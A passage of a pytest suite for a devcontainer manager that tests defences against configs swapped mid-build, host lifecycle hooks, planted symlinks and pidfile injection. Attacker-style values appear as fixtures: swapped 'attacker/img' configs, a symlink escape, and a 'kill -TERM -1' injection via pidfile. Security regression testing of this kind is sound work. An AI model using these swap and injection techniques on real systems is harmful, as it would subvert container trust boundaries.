    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        with pytest.raises(devc.DevcontainerNotTrusted):
            await devc.DevcontainerManager().up(project, rebuild=True)
        assert no_subprocess == []


class TestProjectTokenDoesNotReRealpathOnTheLoop:
    """``_id_label`` is called from ``status()`` / ``up()`` on the event loop.

    The key those callers pass is already realpath'd off-loop. Walking it
    again via ``_project_token`` can stall the gateway heartbeat on a
    network-backed mount.
    """

    def test_id_label_hashes_the_canonical_key_without_realpath(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        def boom(path: object) -> str:
            raise AssertionError(f"realpath on the event-loop path: {path!r}")

        monkeypatch.setattr(devc.os.path, "realpath", boom)
        key = "/already/canonical/project"
        label = devc.DevcontainerManager._id_label(key)
        assert label == "kirocrew.devcontainer=" + devc._project_token_from_canonical(key)

    def test_project_token_still_realpaths_when_asked(self, tmp_path: Path) -> None:
        """``_build_root`` still goes through ``_project_token`` off-loop."""
        project = tmp_path / "proj"
        project.mkdir()
        alias = tmp_path / "alias"
        try:
            alias.symlink_to(project)
        except OSError:
            pytest.skip("symlinks unavailable")
        assert devc._project_token(alias) == devc._project_token(project)
        assert devc._project_token(alias) == devc._project_token_from_canonical(
            os.path.realpath(str(project))
        )


# ---------------------------------------------------------------------------
# up(): post-build digest re-verification + kiro-cli preflight
# ---------------------------------------------------------------------------


@pytest.fixture
def cli_stub(monkeypatch: pytest.MonkeyPatch) -> None:
    """Pin the devcontainer CLI argv so tests don't depend on PATH."""
    monkeypatch.setattr(devc, "_cli_argv", lambda: ["devcontainer"])


class TestUpPostBuildDigestReverification:
    """The CLI re-reads the config tree during the build.

    Pins the post-build ``config_digest`` block in ``up()``: both the mismatch
    arm and the error arm must issue ``docker rm -f`` and raise
    ``DevcontainerNotTrusted``. Delete the block and
    ``test_config_swap_during_build_discards_the_container`` fails twice over --
    ``up()`` returns a ``DevcontainerInfo`` instead of raising, and no
    ``docker rm -f`` is ever issued, so a session is handed a container built
    from bytes no human ever saw. The pre-build gate in ``TestUpTrustGate``
    cannot catch this: the swap lands *after* it.
    """

    @pytest.mark.asyncio
    async def test_config_swap_during_build_discards_the_container(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)

        def swap() -> None:
            # Lands while `devcontainer up` is in flight — i.e. after the
            # pre-build trust check and inside the window where the CLI does
            # its own read of the tree.
            cfg.write_bytes(b'{"image": "attacker/img:latest"}')

        rec = _ExecRecorder(_up_ok("cid-toctou", on_communicate=swap))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        mgr = devc.DevcontainerManager()
        with pytest.raises(devc.DevcontainerNotTrusted, match="changed during the build"):
            await mgr.up(project)

        assert rec.calls[0][:2] == ["devcontainer", "up"]
        assert ["docker", "rm", "-f", "cid-toctou"] in rec.calls
        # No kiro-cli preflight, and nothing cached for a later session.
        assert not any("command -v kiro-cli" in c for call in rec.calls for c in call)
        assert mgr._infos == {}

    @pytest.mark.asyncio
    async def test_an_unverifiable_config_also_discards_the_container(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A RAISE from the re-verification must tear down too, not propagate.

        Losing the ability to verify mid-build is not "unknown, carry on": it is
        exactly when a swap shows up (the tree becomes unreadable, or a symlink
        appears). Previously only the mismatch arm removed the container, so an
        exception left a freshly built container running that nothing vouched
        for.

        Revert-verified: dropping the try/except around the post-build digest
        leaves the container alive and surfaces the raw error instead.
        """
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)

        def break_the_tree() -> None:
            # Unreadable rather than merely changed, so config_digest raises.
            cfg.unlink()
            cfg.parent.rmdir()

        rec = _ExecRecorder(_up_ok("cid-unverifiable", on_communicate=break_the_tree))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        mgr = devc.DevcontainerManager()
        with pytest.raises(devc.DevcontainerNotTrusted, match="could not be re-verified"):
            await mgr.up(project)

        assert ["docker", "rm", "-f", "cid-unverifiable"] in rec.calls
        assert mgr._infos == {}

    @pytest.mark.asyncio
    async def test_revoke_during_build_discards_the_container(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A revoke leaves the bytes alone, so digest equality is not enough.

        The post-build digest check would pass and the container would be
        handed out. Revalidate the grant itself before returning.
        """
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        devc.grant_trust(project)

        def revoke() -> None:
            devc.revoke_trust(project)

        rec = _ExecRecorder(_up_ok("cid-revoked", on_communicate=revoke))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        mgr = devc.DevcontainerManager()
        with pytest.raises(devc.DevcontainerNotTrusted, match="withdrawn during the build"):
            await mgr.up(project)

        assert ["docker", "rm", "-f", "cid-revoked"] in rec.calls
        assert mgr._infos == {}

    @pytest.mark.asyncio
    async def test_swap_with_no_container_id_still_refuses(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A success record without containerId must not crash the teardown."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)

        record = json.dumps({"outcome": "success", "remoteWorkspaceFolder": "/w"})
        proc = _FakeProc(
            stdout=(record + "\n").encode(),
            on_communicate=lambda: cfg.write_bytes(b'{"image": "evil"}'),
        )
        rec = _ExecRecorder(proc)
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        with pytest.raises(devc.DevcontainerNotTrusted):
            await devc.DevcontainerManager().up(project)
        assert not any(call[:3] == ["docker", "rm", "-f"] for call in rec.calls)

    @pytest.mark.asyncio
    async def test_stable_config_reaches_the_preflight_and_caches_the_info(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        digest = devc.grant_trust(project)

        rec = _ExecRecorder(_up_ok("cid-ok"), _FakeProc(returncode=0))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        mgr = devc.DevcontainerManager()
        info = await mgr.up(project)

        assert info.container_id == "cid-ok"
        assert info.remote_workspace_folder == "/workspaces/proj"
        assert info.remote_user == "vscode"
        assert info.config_digest == digest == devc.config_digest(cfg)
        assert mgr._infos[os.path.realpath(str(project))] is info
        # Second call is the kiro-cli preflight probe, not a teardown. It runs as
        # the reported remoteUser: probing as the image's default user would clear
        # an image where kiro-cli is on root's PATH but not that user's, which is
        # the exact failure the preflight exists to catch.
        assert rec.calls[1][:5] == ["docker", "exec", "-u", "vscode", "cid-ok"]
        assert "command -v kiro-cli" in rec.calls[1]

    @pytest.mark.asyncio
    async def test_missing_kiro_cli_fails_with_an_install_hint(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """N1: a bare exec-127 surfaces as a generic ACP init failure."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        devc.grant_trust(project)

        rec = _ExecRecorder(_up_ok("cid-nocli"), _FakeProc(returncode=127))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        mgr = devc.DevcontainerManager()
        with pytest.raises(devc.DevcontainerError, match="kiro-cli is not installed"):
            await mgr.up(project)
        assert mgr._infos == {}


class TestUpBuildsFromTheSanitizedConfig:
    """``up()`` points the CLI at ``write_build_config``'s copy, not the file.

    Without ``--override-config`` the CLI re-parses the project's own
    devcontainer.json and would execute its ``initializeCommand`` on the host,
    which is the one thing the container boundary is supposed to prevent — and
    the strip in ``write_build_config`` would be dead code.

    REVERT-VERIFIED — pins the ``build_config = await asyncio.to_thread(
    write_build_config, key, digest)`` line and the ``"--override-config",
    str(build_config)`` argv pair in ``up()``. Remove them and
    ``test_override_config_points_at_the_sanitized_copy`` fails on the missing
    flag, and ``test_host_lifecycle_hook_never_reaches_the_cli`` fails because
    the only config the CLI is given is the project's, hook included.
    Verified: deleting the argv pair failed 2 of the 3 tests here; source md5
    unchanged after restoring.
    """

    @pytest.mark.asyncio
    async def test_override_config_points_at_the_sanitized_copy(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        digest = devc.grant_trust(project)

        rec = _ExecRecorder(_up_ok("cid-ok"), _FakeProc(returncode=0))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)
        await devc.DevcontainerManager().up(project)

        argv = rec.calls[0]
        assert argv[:2] == ["devcontainer", "up"]
        assert "--override-config" in argv
        override = Path(argv[argv.index("--override-config") + 1])
        expected = _expected_build_root(trust_home, project) / digest[:24] / "devcontainer.json"
        assert override == expected
        assert override.is_file()
        # Not the project's own file, and not inside the agent-writable tree.
        assert override != cfg
        assert project not in override.parents
        # The workspace folder is still the real project: only the CONFIG is
        # relocated, which is why build inputs must stay inside the tree.
        assert argv[argv.index("--workspace-folder") + 1] == os.path.realpath(str(project))

    @pytest.mark.asyncio
    async def test_host_lifecycle_hook_never_reaches_the_cli(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """End to end: a trusted config carrying ``initializeCommand`` builds
        from a copy that does not have it."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(
            project,
            json.dumps({"image": "ubuntu:24.04", "initializeCommand": _HOST_HOOK}),
        )
        devc.grant_trust(project)

        rec = _ExecRecorder(_up_ok("cid-ok"), _FakeProc(returncode=0))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)
        await devc.DevcontainerManager().up(project)

        argv = rec.calls[0]
        override = Path(argv[argv.index("--override-config") + 1])
        assert "initializeCommand" not in json.loads(override.read_text(encoding="utf-8"))
        assert _HOST_HOOK not in override.read_text(encoding="utf-8")

    @pytest.mark.asyncio
    async def test_swap_between_the_trust_check_and_the_write_refuses(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """REVERT-VERIFIED (post-trust swap) — the digest re-check inside
        ``write_build_config`` is what stops a tree that moved between ``up()``'s
        trust gate and the build. Patched here to land in exactly that window;
        drop the re-check and the CLI is spawned with the attacker's config.
        """
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)

        real_write = devc.write_build_config

        def swap_then_write(project_dir: str, digest: str) -> Path:
            cfg.write_bytes(json.dumps({"image": "attacker/img:latest"}).encode())
            return real_write(project_dir, digest)

        monkeypatch.setattr(devc, "write_build_config", swap_then_write)
        rec = _ExecRecorder(_up_ok("cid-ok"), _FakeProc(returncode=0))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        mgr = devc.DevcontainerManager()
        with pytest.raises(devc.DevcontainerConfigChanged):
            await mgr.up(project)
        # Refused BEFORE the CLI ran: nothing was spawned and nothing cached.
        assert rec.calls == []
        assert mgr._infos == {}


# ---------------------------------------------------------------------------
# kill_exec
# ---------------------------------------------------------------------------


class TestKillExec:
    """The kill target is discovered from /proc/<pid>/environ, not a file.

    REVERT-VERIFIED — pins the environ scan
    (``for E in /proc/[0-9]*/environ; do ... grep -qx
    "$DEVCONTAINER_EXEC_ENV=<exec_id>"``) and the pidfile validation
    (``case "$P" in ""|*[!0-9]*|0*|1) exit 0;; esac``) in
    ``DevcontainerManager.kill_exec``. Revert to reading the pidfile
    unconditionally and ``test_environ_scan_is_the_primary_discovery`` fails
    (no ``/proc`` scan in the script) and
    ``test_pidfile_is_only_a_fallback`` fails (the ``cat`` is no longer
    behind ``[ -z "$PIDS" ]``). Drop the ``case`` validation and
    ``test_pidfile_fallback_rejects_unsafe_values`` fails — a container-side
    process could write ``1`` into the pidfile and turn the group kill into
    ``kill -TERM -1``, i.e. signal everything in the container.
    """

    @staticmethod
    async def _script(monkeypatch: pytest.MonkeyPatch, exec_id: str) -> tuple[str, list[list[str]]]:
        rec = _ExecRecorder(_FakeProc())
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)
        await devc.DevcontainerManager().kill_exec(_info(container_id="cid"), exec_id)
        argv = rec.calls[0]
        assert argv[:4] == ["docker", "exec", "cid", "sh"]
        assert argv[4] == "-c"
        return argv[5], rec.calls

    @pytest.mark.asyncio
    async def test_environ_scan_is_the_primary_discovery(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        exec_id = uuid.uuid4().hex
        script, _ = await self._script(monkeypatch, exec_id)
        assert "for E in /proc/[0-9]*/environ" in script
        assert 'tr "\\0" "\\n"' in script
        assert f'grep -qx "{devc.DEVCONTAINER_EXEC_ENV}={exec_id}"' in script
        # The environ block is fixed at exec time, so the scan is the
        # authoritative source and must run before any fallback.
        assert script.index("/proc/[0-9]*/environ") < script.index("cat /tmp/kirocrew-exec")

    @pytest.mark.asyncio
    async def test_pidfile_is_only_a_fallback(self, monkeypatch: pytest.MonkeyPatch) -> None:
        exec_id = uuid.uuid4().hex
        script, _ = await self._script(monkeypatch, exec_id)
        pidfile = f"/tmp/kirocrew-exec/{exec_id}.pid"
        assert f"cat {pidfile}" in script
        assert script.index('if [ -z "$PIDS" ]') < script.index(f"cat {pidfile}")

    @pytest.mark.asyncio
    async def test_pidfile_fallback_rejects_unsafe_values(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        script, _ = await self._script(monkeypatch, uuid.uuid4().hex)
        # ""  -> empty; *[!0-9]* -> non-numeric; 0* -> leading zero;
        # 1   -> PID 1, whose group kill is `kill -TERM -1` (signal all).
        assert 'case "$P" in ""|*[!0-9]*|0*|1) exit 0;; esac' in script

    @pytest.mark.asyncio
    async def test_group_kill_escalates_term_then_kill(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        script, _ = await self._script(monkeypatch, uuid.uuid4().hex)
        assert 'kill -TERM -"$P"' in script
        assert 'kill -KILL -"$P"' in script
        assert script.index("kill -TERM") < script.index("kill -KILL")

    @pytest.mark.asyncio
    async def test_exec_id_is_interpolated_as_uuid_hex_only(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Injection safety premise: exec_id is never caller-supplied text.

        The script interpolates exec_id unquoted into a pidfile path, so the
        value must be hex. Both halves are asserted: the gateway's generator,
        and that every occurrence in the script is that bare hex string.

        The generator is pinned in ``devcontainer.py`` rather than in an ACP
        spawn path. Both spawn paths (AcpRuntime and AcpClient) are live and
        each used to mint its own id, so the guarantee could hold on one and be
        broken on the other; ``containerize_spawn`` is now the only place an id
        is created, and pinning it there is what keeps that true.
        """
        # encoding pinned: the module carries non-ASCII prose (em dashes, box
        # rules), and read_text() without it decodes through the locale codec
        # (cp1252 on Windows) and raises UnicodeDecodeError.
        src = Path(devc.__file__).read_text(encoding="utf-8")
        assert "exec_id = uuid.uuid4().hex" in src
        # No spawn path may reintroduce a private mint.
        for mod in (acp_client_mod, acp_runtime_mod):
            other = Path(mod.__file__).read_text(encoding="utf-8")
            assert "uuid.uuid4().hex" not in other

        exec_id = uuid.uuid4().hex
        assert re.fullmatch(r"[0-9a-f]{32}", exec_id)
        script, _ = await self._script(monkeypatch, exec_id)
        # Exactly three uses: the grep pattern, the pidfile read, the unlink.
        assert len(re.findall(re.escape(exec_id), script)) == 3
        # No shell metacharacter can ride in on the id.
        assert not set(exec_id) & set(" \t\n'\"$`;&|<>()*?[]{}\\")

    @pytest.mark.asyncio
    async def test_pidfile_is_removed_after_the_kill(self, monkeypatch: pytest.MonkeyPatch) -> None:
        exec_id = uuid.uuid4().hex
        script, _ = await self._script(monkeypatch, exec_id)
        assert script.rstrip().endswith(f"rm -f /tmp/kirocrew-exec/{exec_id}.pid")


# ---------------------------------------------------------------------------
# status() / down(): id-label fallback and the enabled flag
# ---------------------------------------------------------------------------


def _pin_mode(monkeypatch: pytest.MonkeyPatch, mode: str) -> None:
    """Pin ``agent.devcontainer`` without touching the real data home."""
    from kiro_crew.config.loader import KiroCrewConfig

    monkeypatch.setattr(
        KiroCrewConfig,
        "load",
        classmethod(lambda cls: SimpleNamespace(agent=SimpleNamespace(devcontainer=mode))),
    )


class TestStatus:
    """M5 (label fallback after a gateway restart) and M4 (enabled flag)."""

    @pytest.mark.asyncio
    async def test_cold_cache_finds_a_live_container_by_label(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        _pin_mode(monkeypatch, "auto")

        rec = _ExecRecorder(_FakeProc(stdout=b"cid-live\n"))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        out = await devc.DevcontainerManager().status(project)
        assert out["container_id"] == "cid-live"
        assert out["running"] is True
        assert out["has_config"] is True
        assert rec.calls[0][:4] == ["docker", "ps", "-q", "--filter"]
        assert rec.calls[0][4].startswith("label=kirocrew.devcontainer=")

    @pytest.mark.asyncio
    async def test_cold_cache_with_no_container_reports_not_running(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        _pin_mode(monkeypatch, "auto")
        monkeypatch.setattr(asyncio, "create_subprocess_exec", _ExecRecorder(_FakeProc()))

        out = await devc.DevcontainerManager().status(project)
        assert out["container_id"] is None
        assert out["running"] is False

    @pytest.mark.asyncio
    async def test_no_label_lookup_without_a_config(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _pin_mode(monkeypatch, "auto")
        rec = _ExecRecorder()
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        out = await devc.DevcontainerManager().status(project)
        assert out["has_config"] is False
        assert out["trusted"] is False
        assert rec.calls == []

    @pytest.mark.asyncio
    async def test_warm_cache_uses_inspect_not_the_label(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        _pin_mode(monkeypatch, "auto")

        mgr = devc.DevcontainerManager()
        key = os.path.realpath(str(project))
        mgr._infos[key] = _info(container_id="cid-cached", project_dir=key)
        rec = _ExecRecorder(_FakeProc(stdout=b"true\n"))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        out = await mgr.status(project)
        assert out["container_id"] == "cid-cached"
        assert out["running"] is True
        assert out["remote_workspace_folder"] == "/workspaces/proj"
        assert rec.calls[0][:2] == ["docker", "inspect"]
        assert not any("--filter" in call for call in rec.calls)

    @pytest.mark.asyncio
    async def test_enabled_is_false_when_the_mode_is_off(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """M4: the frontend must not show a trust prompt for an inert feature."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        _pin_mode(monkeypatch, "off")
        monkeypatch.setattr(asyncio, "create_subprocess_exec", _ExecRecorder(_FakeProc()))

        out = await devc.DevcontainerManager().status(project)
        assert out["enabled"] is False
        assert out["has_config"] is True  # the config is still reported

    @pytest.mark.asyncio
    async def test_enabled_is_true_only_for_auto(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Mode alone decides ``enabled`` once the dev opt-in is open.

        The env gate is set here so this stays a test of the MODE parsing; the
        gate's own behavior (including mode ``auto`` with the gate shut) is
        covered by TestDevOptInGate.
        """
        monkeypatch.setenv(devc.DEVCONTAINER_ENV_VAR, "1")
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        monkeypatch.setattr(asyncio, "create_subprocess_exec", _ExecRecorder(_FakeProc()))

        for mode, expected in (("auto", True), ("off", False), ("", False), ("Auto", False)):
            _pin_mode(monkeypatch, mode)
            out = await devc.DevcontainerManager().status(project)
            assert out["enabled"] is expected, mode

    @pytest.mark.asyncio
    async def test_unloadable_config_does_not_break_status(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from kiro_crew.config.loader import KiroCrewConfig

        def boom(cls):  # type: ignore[no-untyped-def]
            raise RuntimeError("config unreadable")

        monkeypatch.setattr(KiroCrewConfig, "load", classmethod(boom))
        project = tmp_path / "proj"
        project.mkdir()
        monkeypatch.setattr(asyncio, "create_subprocess_exec", _ExecRecorder())

        out = await devc.DevcontainerManager().status(project)
        assert out["enabled"] is False


class TestDown:
    """M5: a container must never become unreapable after a gateway restart."""

    @pytest.mark.asyncio
    async def test_cold_cache_removes_by_label(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        rec = _ExecRecorder(_FakeProc(stdout=b"cid-orphan\n"), _FakeProc(returncode=0))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        assert await devc.DevcontainerManager().down(tmp_path) is True
        assert rec.calls[0][:3] == ["docker", "ps", "-q"]
        assert rec.calls[1] == ["docker", "rm", "-f", "cid-orphan"]

    @pytest.mark.asyncio
    async def test_warm_cache_removes_without_a_label_lookup(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        mgr = devc.DevcontainerManager()
        key = os.path.realpath(str(tmp_path))
        mgr._infos[key] = _info(container_id="cid-cached", project_dir=key)
        rec = _ExecRecorder(_FakeProc(returncode=0))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        assert await mgr.down(tmp_path) is True
        assert rec.calls == [["docker", "rm", "-f", "cid-cached"]]
        assert mgr._infos == {}

    @pytest.mark.asyncio
    async def test_no_container_anywhere_is_a_false_not_an_error(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        rec = _ExecRecorder(_FakeProc(stdout=b"\n"))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        assert await devc.DevcontainerManager().down(tmp_path) is False
        assert len(rec.calls) == 1  # no rm attempted

    @pytest.mark.asyncio
    async def test_failed_removal_reports_false(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        rec = _ExecRecorder(_FakeProc(stdout=b"cid\n"), _FakeProc(returncode=1))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)
        assert await devc.DevcontainerManager().down(tmp_path) is False


# ---------------------------------------------------------------------------
# M2: AcpClient devcontainer state is reset with the process
# ---------------------------------------------------------------------------


class TestAcpClientDevcontainerStateReset:
    """M2: stale devcontainer state would misroute cwd and the kill path.

    ``_reset_state`` runs after the kiro-cli process is dead. A retained
    ``_devcontainer_info`` would make the next ``_acp_cwd`` report a
    container-side path for a host-side respawn, and a retained
    ``_devcontainer_exec_id`` would aim ``kill_exec`` at a pidfile belonging
    to a dead exec.
    """

    def _client(self):  # type: ignore[no-untyped-def]
        from kiro_crew.acp.client import AcpClient

        client = AcpClient()
        client._process = None
        client._pid = None
        client._child_pids = {}
        return client

    def test_fresh_client_has_both_attributes_unset(self) -> None:
        client = self._client()
        assert client._devcontainer_info is None
        assert client._devcontainer_exec_id is None

    def test_reset_state_clears_both_attributes(self) -> None:
        client = self._client()
        client._devcontainer_info = _info()
        client._devcontainer_exec_id = uuid.uuid4().hex

        client._reset_state()

        assert client._devcontainer_info is None
        assert client._devcontainer_exec_id is None


class TestBuildConfigReaper:
    """Superseded sanitized build configs must not accumulate forever.

    REVERT-VERIFIED: drop the ``_prune_superseded_build_configs`` call at the end
    of ``write_build_config`` and ``test_superseded_digest_is_reaped`` fails with
    the old directory still present. Restore the project component in
    ``_build_root`` to a bare ``digest[:24]`` and
    ``test_another_projects_build_config_survives`` fails, because the two
    projects would then share one directory level and the prune could not tell
    them apart.
    """

    def _project(self, tmp_path: Path, cfg: dict, name: str = "proj") -> tuple[Path, Path]:
        project = tmp_path / name
        (project / ".devcontainer").mkdir(parents=True)
        path = project / ".devcontainer" / "devcontainer.json"
        path.write_bytes(json.dumps(cfg).encode())
        return project, path

    def test_superseded_digest_is_reaped(self, tmp_path: Path, trust_home: Path) -> None:
        """The whole finding: editing a trusted config left the old dir behind."""
        project, cfg = self._project(tmp_path, {"image": "ubuntu:24.04"})
        first_digest = devc.config_digest(cfg)
        first = devc.write_build_config(str(project), first_digest)
        assert first.is_file()

        cfg.write_bytes(json.dumps({"image": "ubuntu:22.04"}).encode())
        second_digest = devc.config_digest(cfg)
        assert second_digest != first_digest
        second = devc.write_build_config(str(project), second_digest)

        assert second.is_file()
        assert not first.parent.exists()
        root = _expected_build_root(trust_home, project)
        assert sorted(p.name for p in root.iterdir()) == [second_digest[:24]]

    def test_current_digest_is_never_reaped(self, tmp_path: Path, trust_home: Path) -> None:
        """up() rewrites the same digest on every rebuild; that must survive."""
        project, cfg = self._project(tmp_path, {"image": "ubuntu:24.04"})
        digest = devc.config_digest(cfg)
        out = devc.write_build_config(str(project), digest)
        assert devc.write_build_config(str(project), digest) == out
        assert out.is_file()

    def test_another_projects_build_config_survives(self, tmp_path: Path, trust_home: Path) -> None:
        """Containment: the reaper may only ever touch ONE project's root."""
        a, cfg_a = self._project(tmp_path, {"image": "ubuntu:24.04"}, name="a")
        b, cfg_b = self._project(tmp_path, {"image": "debian:12"}, name="b")
        out_a = devc.write_build_config(str(a), devc.config_digest(cfg_a))
        out_b = devc.write_build_config(str(b), devc.config_digest(cfg_b))
        assert out_a.parent != out_b.parent

        # A new config for A supersedes A's own artifacts and nothing else.
        cfg_a.write_bytes(json.dumps({"image": "ubuntu:22.04"}).encode())
        devc.write_build_config(str(a), devc.config_digest(cfg_a))

        assert not out_a.parent.exists()
        assert out_b.is_file()

    def test_unrecognized_entries_are_left_alone(self, tmp_path: Path, trust_home: Path) -> None:
        """Only digest-named dirs were written by us; anything else is not ours
        to delete, so it is preserved rather than guessed at."""
        project, cfg = self._project(tmp_path, {"image": "ubuntu:24.04"})
        devc.write_build_config(str(project), devc.config_digest(cfg))
        root = _expected_build_root(trust_home, project)
        stray_dir = root / "not-a-digest"
        stray_dir.mkdir()
        stray_file = root / "README"
        stray_file.write_text("x", encoding="utf-8")

        cfg.write_bytes(json.dumps({"image": "ubuntu:22.04"}).encode())
        devc.write_build_config(str(project), devc.config_digest(cfg))

        assert stray_dir.is_dir()
        assert stray_file.is_file()

    def test_a_planted_symlink_is_unlinked_not_followed(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """The delete must not escape the build root. A digest-named SYMLINK is
        removed as a link; its target and the target's contents are untouched."""
        project, cfg = self._project(tmp_path, {"image": "ubuntu:24.04"})
        devc.write_build_config(str(project), devc.config_digest(cfg))
        root = _expected_build_root(trust_home, project)

        outside = tmp_path / "outside"
        outside.mkdir()
        victim = outside / "keep.txt"
        victim.write_text("keep", encoding="utf-8")
        link = root / ("a" * 24)
        link.symlink_to(outside, target_is_directory=True)

        cfg.write_bytes(json.dumps({"image": "ubuntu:22.04"}).encode())
        devc.write_build_config(str(project), devc.config_digest(cfg))

        assert not link.exists()
        assert not link.is_symlink()
        assert outside.is_dir()
        assert victim.read_text(encoding="utf-8") == "keep"

    @pytest.mark.asyncio
    async def test_down_reaps_the_projects_build_configs(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Teardown: nothing will consume the config again, so it is collected
        even though no container was found."""
        project, cfg = self._project(tmp_path, {"image": "ubuntu:24.04"})
        out = devc.write_build_config(str(project), devc.config_digest(cfg))
        assert out.is_file()

        mgr = devc.DevcontainerManager()

        async def no_container(_key: str) -> str | None:
            return None

        monkeypatch.setattr(mgr, "_find_by_label", no_container)

        assert await mgr.down(project) is False
        assert not out.parent.exists()
        assert not _expected_build_root(trust_home, project).exists()


class TestStatusWithoutDocker:
    """``status()`` is polled by the dashboard and must not depend on docker.

    REVERT-VERIFIED: remove the ``docker_available()`` guard around the
    container lookup and this fails — ``_find_by_label`` spawns the ``docker``
    binary, which raises FileNotFoundError on a host without it, and the polled
    endpoint turns that into a 500.
    """

    @pytest.mark.asyncio
    async def test_config_present_but_no_docker_reports_absent_container(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        project = tmp_path / "proj"
        (project / ".devcontainer").mkdir(parents=True)
        cfg = project / ".devcontainer" / "devcontainer.json"
        cfg.write_bytes(_SAMPLE_CONFIG.encode())
        devc.grant_trust(project)

        monkeypatch.setattr(devc, "docker_available", lambda: False)

        def no_subprocess(*_a: object, **_k: object) -> None:
            raise AssertionError("status() must not spawn docker when it is absent")

        monkeypatch.setattr(asyncio, "create_subprocess_exec", no_subprocess)

        out = await devc.DevcontainerManager().status(project)

        # The docker-independent facts still answer correctly — the point is a
        # well-formed status, not merely the absence of an exception.
        assert out["project_dir"] == os.path.realpath(str(project))
        assert out["has_config"] is True
        assert out["config_path"] == str(cfg)
        assert out["trusted"] is True
        # No docker means no container to report.
        assert out["container_id"] is None
        assert out["running"] is False
        assert out["remote_workspace_folder"] is None

    @pytest.mark.asyncio
    async def test_cached_container_is_not_probed_without_docker(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The cached-info branch shells out to docker too (``_alive``), so it
        is behind the same guard."""
        project = tmp_path / "proj"
        (project / ".devcontainer").mkdir(parents=True)
